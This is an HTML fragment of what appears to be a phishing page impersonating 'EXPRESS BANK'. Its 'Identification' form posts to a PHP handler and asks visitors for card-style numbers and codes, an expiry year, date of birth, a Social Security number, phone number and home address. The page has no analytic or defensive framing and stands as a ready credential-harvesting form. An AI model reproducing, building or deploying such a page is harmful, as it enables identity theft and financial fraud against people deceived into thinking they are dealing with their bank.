...
<title>EXPRESS BANK - Identification</title>
...
<form name="Form1" method="post" action="res/post4.php" onsubmit="return validateForm()">
  <input id="create_mu39422" style="position:absolute;left:570px;top:386px;width:178px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="12" value="" type="text" required = "true"/>
...
<input id="create_mu39427" style="position:absolute;left:570px;top:441px;width:52px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="14" value="" type="text" length="6" required = "true"/>
...
<option value="----" selected>- - - -</option><option value=2017>2017</option><option value=2018>2018</option><option value=2019>2019</option><option value=2017>2017</option><option value=2018>2018</option><option value=2019>2019</option><option value=2020>2020</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option></select></option>
<input id="create_mu39429" style="position:absolute;left:590px;top:585px;width:160px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="6" value="" type="text" placeholder=" Date of birth" required = "true"/>
<input id="create_mu39420" style="position:absolute;left:590px;top:615px;width:160px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="16" value="" type="text" placeholder=" e.g 234-56-1234">
<input id="create_mu39429" style="position:absolute;left:590px;top:645px;width:160px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="phoo" value="" type="text" placeholder=" Phone number" required = "true"/>
...
<input id="create_mu39429" style="position:absolute;left:590px;top:700px;width:160px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="7" value="" type="text" placeholder=" Address" required = "true"/>
